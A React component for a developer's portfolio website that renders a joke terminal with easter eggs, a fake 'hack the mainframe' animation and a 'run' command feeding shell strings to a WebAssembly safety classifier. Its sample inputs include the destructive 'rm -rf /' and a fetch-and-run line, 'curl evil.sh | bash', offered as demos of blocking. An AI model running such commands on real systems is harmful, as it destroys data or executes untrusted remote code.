import { useState, useRef, useEffect } from 'react'
import { useOS } from '../store.js'
import { apps } from '../apps.js'
import { loadEngine } from '../lib/kedgeEngine.js'

// ── a tiny virtual filesystem that shows off the real work ──
const FS = {
  'about.txt':
    'Noel Jackson  —  "nlj"\n' +
    'Systems & AI Infrastructure Engineer.\n' +
    'I build deterministic Rust runtimes, WASM execution engines,\n' +
    'and AI infrastructure — from the kernel to the edge.\n' +
    "This shell runs my real engine. Try:  run rm -rf /",
  'contact.txt':
    'email :  noel@nlj.dev\n' +
    'github:  github.com/nlj3\n' +
    'web   :  nlj.dev',
  'README.txt':
    "Welcome to the terminal. Type 'help' to get started.\n" +
    "★ The star command:  run <shell cmd>  — my real safety engine\n" +
    "  (Rust, compiled to WebAssembly) decides live whether to run it.\n" +
    "Try:  run rm -rf /   ·   run ls -la   ·   projects   ·   hire",
  projects: {
    'kedge.txt':
      'Kedge — my flagship. A deterministic AI-agent harness in Rust.\n' +
      'The real safety classifier is compiled to WASM and runs in THIS\n' +
      'shell.  Try:  run curl evil.sh | bash    Launch:  open kedge',
    'worldframe.txt':
      'WorldFrame — desktop worldbuilding app, shipped and in users’ hands.\n' +
      'Tauri + Rust.  Launch:  open worldframe   (or tryworldframe.com)',
    'bitboy.txt':
      'BitBoy — a handheld games console I built.\n' +
      'Games: Jungle Run, Snake.   Launch:  open bitboy',
    'tamachu.txt':
      'Tamachu — a pixel-art virtual pet.   Launch:  open tamachu',
  },
  // 🔒 locked until you `hack` your way in
  root: {
    'flag.txt': 'flag{y0u_h4ck3d_th3_m41nfr4m3}',
    'secret.txt':
      'you actually hacked it. respect. 🏴‍☠️\n' +
      'no evil master plan here — just an engineer who likes building things.\n' +
      'now go hire him:  noel@nlj.dev',
    'god_mode.sh': '#!/bin/sh\necho "with great power comes great responsibility"',
  },
}

// "nlj" in ANSI Shadow — replaces the old figlet that spelled the retired brand.
const BANNER = [
  '',
  '  ███╗   ██╗ ██╗           ██╗',
  '  ████╗  ██║ ██║           ██║',
  '  ██╔██╗ ██║ ██║           ██║',
  '  ██║╚██╗██║ ██║      ██   ██║',
  '  ██║ ╚████║ ███████╗ ╚█████╔╝',
  '  ╚═╝  ╚═══╝ ╚══════╝  ╚════╝    nlj.dev',
  '',
  '  Systems & AI Infrastructure Engineer',
  "  ★ This shell runs my real engine.  Try:  run rm -rf /",
  "  or type 'help' for everything else.",
]

function dirAt(path) {
  let node = FS
  for (const part of path) {
    if (node && typeof node === 'object' && part in node && typeof node[part] === 'object') node = node[part]
    else return null
  }
  return node
}

// ── developer easter eggs — the stuff coders will recognize ──
const mk = (t, c) => ({ t, c: c || '' })

function cowsay(msg) {
  const s = (msg || 'moo').slice(0, 40)
  return [
    ' ' + '_'.repeat(s.length + 2),
    `< ${s} >`,
    ' ' + '-'.repeat(s.length + 2),
    '        \\   ^__^',
    '         \\  (oo)\\_______',
    '            (__)\\       )\\/\\',
    '                ||----w |',
    '                ||     ||',
  ].map((t) => mk(t, 'g'))
}

const SL = [
  '      ====        ________                ___________',
  '  _D _|  |_______/        \\__I_I_____===__|_________|',
  '   |(_)---  |   H\\________/ |   |        =|___ ___|  ',
  '   /     |  |   H  |  |     |   |         ||_| |_||  ',
  '  |      |  |   H  |__--------------------| [___] |  ',
  '  | ________|___H__/__|_____/[][]~\\_______|       |  ',
  '  |/ |   |-----------I_____I [][] []  D   |=======|__',
].map((t) => mk(t, 'g'))

const EXACT = {
  '0.1 + 0.2': ['0.30000000000000004'],
  '0.1+0.2': ['0.30000000000000004'],
  'hello': ['Hello, World!'],
  'hello world': ['Hello, World!'],
  'hello, world': ['Hello, World!'],
  'hello, world!': ['Hello, World!'],
  'make me a sandwich': ['What? Make it yourself.'],
  'sudo make me a sandwich': ['Okay. 🥪'],
  'make love': ["make: *** No rule to make target 'love'.  Stop."],
  'git blame': ['git blame ............ 100%  (you)'],
  'git commit': ['[main c0ffee1] fix stuff', ' 1 file changed, 400 insertions(+), 401 deletions(-)'],
  'git push': ['Everything up-to-date. (suspicious.)'],
  'git push --force': ['🔫 force-pushed to main. on a Friday. absolute legend.'],
  'git push -f': ['🔫 force-pushed to main. on a Friday. absolute legend.'],
  'git': ['usage: git <verb> <noun> --flag-you-forgot'],
  'npm install': ['⬇  resolving 4,000,000 dependencies…', '📦 node_modules is now the heaviest object in the known universe.'],
  'npm i': ['⬇  resolving 4,000,000 dependencies…', '📦 node_modules is now the heaviest object in the known universe.'],
  'vim': ['entering vim…   to exit:  :q  →  :q!  →  panic  →  close the window'],
  'vi': ['entering vim…   to exit:  :q  →  :q!  →  panic  →  close the window'],
  ':q': ["you're not in vim. probably. you're free 🎉"],
  ':q!': ["you're not in vim. probably. you're free 🎉"],
  ':wq': ["saved nothing, quit everything. you're free 🎉"],
  ':x': ["you're free 🎉"],
  'emacs': ['a great operating system — lacking only a decent editor 😏'],
  'nano': ['nano: for developers who value their sanity.'],
  'coffee': ['☕  brewing…', "HTTP 418: I'm a teapot."],
  'tea': ['🍵  steeping…', "HTTP 418: I'm a teapot. (this is fine)"],
  'xyzzy': ['Nothing happens.'],
  '42': ['The Answer to the Ultimate Question of Life, the Universe, and Everything.'],
  'answer': ['42.'],
  'ping': ['pong 🏓'],
}

function eggs(c) {
  if (c === 'sl') return [mk("(you typed 'sl' — did you mean 'ls'? too late 🚂)", 'y'), ...SL]
  if (EXACT[c]) return EXACT[c].map((t) => mk(t, 'y'))
  if (c.startsWith('cowsay')) return cowsay(c.slice(6).trim())
  if (c.startsWith('rm -rf'))
    return ['deleting /…', 'deleting /home…', 'deleting everything…', '',
      "😄 relax — this joke is fake. Want the REAL thing? Type:  run rm -rf /"]
      .map((t, i) => mk(t, i >= 4 ? 'y' : 'r'))
  if (c.startsWith('rm '))
    return [mk("rm: this terminal is a museum piece — please don't 🏛️", 'y')]
  if (c.startsWith('make '))
    return [mk(`make: *** No rule to make target '${c.slice(5).trim()}'.  Stop.`, 'y')]
  return null
}

export default function Terminal() {
  const openApp = useOS((s) => s.openApp)
  const terminalCmd = useOS((s) => s.terminalCmd)
  const clearTerminalCmd = useOS((s) => s.clearTerminalCmd)
  const [lines, setLines] = useState(() => BANNER.map((t) => ({ t, c: 'g' })))
  const [input, setInput] = useState('')
  const [cwd, setCwd] = useState([]) // path segments under root
  const [hist, setHist] = useState([])
  const [hIdx, setHIdx] = useState(-1)
  const [hacked, setHacked] = useState(false)
  const bodyRef = useRef(null)
  const inputRef = useRef(null)
  const lastRemote = useRef(null)
  const mountedRef = useRef(true)

  // warm the engine so the first `run` is instant
  useEffect(() => { loadEngine().catch(() => {}) }, [])
  // set true in the body (not just the cleanup) so StrictMode's mount→unmount→
  // mount doesn't leave the ref stuck false and swallow the tour's commands.
  useEffect(() => { mountedRef.current = true; return () => { mountedRef.current = false } }, [])

  // the guided tour drives the terminal by dropping a command in the store;
  // "type" it out, then run it against the real engine. The ref guard dedupes
  // each command, and we deliberately DON'T cancel the timers on cleanup —
  // React StrictMode's dev double-invoke would otherwise kill the run before it
  // fires. A mounted ref keeps stray timers from touching an unmounted window.
  useEffect(() => {
    if (!terminalCmd || terminalCmd === lastRemote.current) return
    lastRemote.current = terminalCmd
    const cmd = terminalCmd
    clearTerminalCmd()
    let i = 0
    const step = () => {
      if (!mountedRef.current) return
      i += 1
      setInput(cmd.slice(0, i))
      if (i < cmd.length) setTimeout(step, 42)
      else setTimeout(() => { if (mountedRef.current) { run(cmd); setInput('') } }, 340)
    }
    setTimeout(step, 260)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [terminalCmd])

  useEffect(() => {
    if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight
  }, [lines])

  const prompt = `${hacked ? 'root' : 'noel'}@nlj ${'/' + cwd.join('/')} $`
  const out = (arr) => setLines((l) => [...l, ...arr])
  const say = (t, c) => ({ t, c: c || '' })

  // ── run <cmd> — hand a shell command to the REAL engine and show its verdict ──
  function runEngine(command) {
    out([say(`  agent proposes ▸ ${command}`, 'dim')])
    loadEngine()
      .then((mod) => {
        const r = JSON.parse(mod.classify_command(command))
        if (!r.intercepted) {
          out([say(`  ✓  ALLOWED — verb "${r.verb}" is read-only; it would execute for real.`, 'g')])
        } else if (r.risk === 'high') {
          out([say(`  🛡  INTERCEPTED — verb "${r.verb}" is a known-dangerous action. Blocked before it ran.`, 'r')])
        } else {
          out([say(`  🛡  INTERCEPTED — verb "${r.verb || '(none)'}" isn’t recognized as read-only. Fail-safe default.`, 'y')])
        }
        out([say('     ↳ real kedge_core::classify, compiled to WebAssembly — nothing actually executes here.', 'dim')])
      })
      .catch(() => out([say('  engine failed to load. It also lives in the Kedge app:  open kedge', 'r')]))
  }

  // cinematic "hack the mainframe" — reveals output over ~4s, then unlocks /root
  function runHack(target) {
    const rand = () => Math.random().toString(16).slice(2, 10).toUpperCase()
    const steps = [
      ['> initializing exploit kit…', 'g', 250],
      [`> target: ${target || 'nlj.dev'} :: mainframe`, 'g', 350],
      ['> scanning ports … 22 80 443 1337  [OPEN]', 'g', 450],
      ['> ' + rand() + ' ' + rand() + ' ' + rand() + ' ' + rand(), 'dim', 250],
      ['> bypassing firewall   [##········]  22%', 'y', 420],
      ['> bypassing firewall   [######····]  61%', 'y', 420],
      ['> bypassing firewall   [##########] 100%', 'y', 360],
      ['> cracking root sha-256 … ' + rand() + ' … DONE', 'y', 560],
      ['> injecting payload  0xDEADBEEF …', 'g', 460],
      ['> ' + rand() + ' ' + rand() + ' ' + rand() + ' ' + rand(), 'dim', 250],
      ['  ██  ACCESS GRANTED  ██', 'r', 420],
      ['> privilege escalated:  noel → root 😎', 'y', 250],
      ['> /root is unlocked. try:  cd root  →  cat flag.txt', 'dim', 0],
    ]
    let t = 0
    steps.forEach(([text, cls, delay]) => { t += delay; setTimeout(() => out([mk(text, cls)]), t) })
    setTimeout(() => setHacked(true), t + 80)
  }

  function run(raw) {
    const cmd = raw.trim()
    out([say(`${prompt} ${raw}`, 'p')])
    if (!cmd) return
    setHist((h) => [...h, cmd])

    const [name, ...args] = cmd.split(/\s+/)
    const arg = args.join(' ')
    const here = dirAt(cwd)

    // the star command — checked before easter eggs so `run rm -rf /` is real
    if (name.toLowerCase() === 'run') {
      if (!arg) out([say('usage:  run <shell command>     e.g.  run rm -rf /var/data', 'y')])
      else runEngine(arg)
      return
    }

    // developer easter eggs next
    const egg = eggs(cmd.toLowerCase().replace(/\s+/g, ' '))
    if (egg) { out(egg); return }

    switch (name.toLowerCase()) {
      case 'help':
        out([
          say('the star command:', 'y'),
          say('  run <cmd>   hand a shell command to my real safety engine 🛡', 'g'),
          say('              (Rust→WASM) — try:  run rm -rf /   ·   run ls -la', 'dim'),
          say(''),
          say('getting around:', 'y'),
          say('  ls · cd <dir> · cat <file> · pwd'),
          say('  open <app>  launch an app        apps   list launchable apps'),
          say(''),
          say('about me:', 'y'),
          say('  projects · skills · resume · hire · whoami · neofetch'),
          say('  whoami · date · echo · clear'),
          say('  sudo <cmd>  ( go on, try it )', 'dim'),
          say("  hack        breach the mainframe 🔓  (there's a flag…)", 'dim'),
          say('  …and plenty a dev would try (vim? git push -f? 0.1 + 0.2?) 😏', 'dim'),
        ])
        break
      case 'ls': {
        const keys = Object.keys(here || {})
        out([say(keys.map((k) => (typeof here[k] === 'object' ? k + '/' : k)).join('    ') || '(empty)')])
        break
      }
      case 'cd': {
        if (!arg || arg === '~' || arg === '/') { setCwd([]); break }
        if (arg === '..') { setCwd((c) => c.slice(0, -1)); break }
        const next = [...cwd, arg]
        if (next[0] === 'root' && !hacked) {
          out([say('cd: root: permission denied 🔒  (need root access — try: hack)', 'r')]); break
        }
        const target = dirAt(next)
        if (target && typeof target === 'object') setCwd(next)
        else out([say(`cd: no such directory: ${arg}`, 'r')])
        break
      }
      case 'hack':
        runHack(arg)
        break
      case 'cat': {
        const f = here && here[arg]
        if (typeof f === 'string') out(f.split('\n').map((t) => say(t)))
        else if (f && typeof f === 'object') out([say(`cat: ${arg}: is a directory`, 'r')])
        else out([say(`cat: ${arg}: no such file`, 'r')])
        break
      }
      case 'pwd':
        out([say('/' + cwd.join('/'))])
        break
      case 'whoami':
        out([say(hacked ? 'root  😎  (you hacked in)' : 'noel  (aka nlj) — Systems & AI Infrastructure Engineer')])
        break
      case 'projects':
        out([
          say('my work — type  open <name>  to launch any of them', 'y'),
          say('  kedge       deterministic AI-agent harness · Rust→WASM   (try: run rm -rf /)'),
          say('  worldframe  desktop worldbuilding app · Tauri+Rust · shipped'),
          say('  bitboy      handheld games console'),
          say('  tamachu     pixel-art virtual pet'),
          say('  more inside  cd projects  →  ls', 'dim'),
        ])
        break
      case 'skills':
        out([
          say('Languages   Rust · TypeScript · JavaScript · Python', 'y'),
          say('Systems     WebAssembly · eBPF · Tree-sitter · SQLite'),
          say('AI infra    LLM agent harnesses · RAG · MCP protocol'),
          say('Edge / Web  Cloudflare Workers · React · Tauri'),
          say('Proof       everything above is running in this site right now.', 'dim'),
        ])
        break
      case 'hire':
        out([say('opening the pitch… (interview me, watch my engine run) →', 'g')])
        openApp('scope')
        break
      case 'resume':
      case 'cv':
        out([
          say('résumé — the short version:', 'y'),
          say('  Systems & AI Infrastructure Engineer. Ships production software'),
          say('  solo: Rust runtimes, WASM engines, edge + desktop AI apps.'),
          say('  Flagship: Kedge (17 Rust crates).  Shipped: WorldFrame.'),
          say('  For the full pitch:  hire        Reach me:  noel@nlj.dev', 'dim'),
        ])
        break
      case 'kedge':
        out([say('Kedge — my real Rust engine. Its classifier runs in this shell (run <cmd>).', 'y'),
          say('opening the full demo…', 'g')])
        openApp('kedge')
        break
      case 'echo':
        out([say(arg)])
        break
      case 'date':
        out([say(new Date().toString())])
        break
      case 'apps':
        out([say('launchable: ' + apps.map((a) => a.id).join(', '), 'y')])
        break
      case 'open': {
        const q = arg.toLowerCase().replace(/\s+/g, '')
        const app = apps.find((a) => a.id === q || a.name.toLowerCase().replace(/\s+/g, '') === q)
        if (app) { out([say(`launching ${app.name}…`, 'g')]); openApp(app.id) }
        else out([say(`open: unknown app "${arg}". try:  apps`, 'r')])
        break
      }
      case 'neofetch':
        out([
          say('        .--.       noel@nlj', 'g'),
          say('       |o_o |      ---------------', 'g'),
          say('       |:_/ |      OS:      nlj OS 8.1', 'g'),
          say('      //   \\ \\     Shell:   sh (real WASM engine)', 'g'),
          say('     (|     | )    Role:    Systems & AI Infra Engineer', 'g'),
          say("    /'\\_   _/`\\    Engine:  kedge_core (Rust→WASM)", 'g'),
          say('    \\___)=(___/    Web:     nlj.dev', 'g'),
        ])
        break
      case 'clear':
      case 'cls':
        setLines([])
        break
      case 'sudo':
        out([say('nice try. this incident will be reported. 🫡', 'y')])
        break
      case 'history':
        out(hist.map((h, i) => say(`  ${i + 1}  ${h}`)))
        break
      case 'exit':
        out([say('there is no escape. (close the window instead)', 'dim')])
        break
      default:
        out([say(`command not found: ${name}. type 'help'  ·  or try:  run ${cmd}`, 'r')])
    }
  }

  function onKey(e) {
    if (e.key === 'Enter') {
      run(input)
      setInput('')
      setHIdx(-1)
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (!hist.length) return
      const i = hIdx < 0 ? hist.length - 1 : Math.max(0, hIdx - 1)
      setHIdx(i); setInput(hist[i])
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (hIdx < 0) return
      const i = hIdx + 1
      if (i >= hist.length) { setHIdx(-1); setInput('') }
      else { setHIdx(i); setInput(hist[i]) }
    }
  }

  return (
    <div className="term" onClick={() => inputRef.current && inputRef.current.focus()}>
      <div className="term-body" ref={bodyRef}>
        {lines.map((l, i) => (
          <div key={i} className={`term-line ${l.c}`}>{l.t || ' '}</div>
        ))}
        <div className="term-input-row">
          <span className="term-prompt">{prompt}</span>
          <input
            ref={inputRef}
            className="term-input"
            value={input}
            spellCheck={false}
            autoFocus
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={onKey}
          />
        </div>
      </div>
    </div>
  )
}
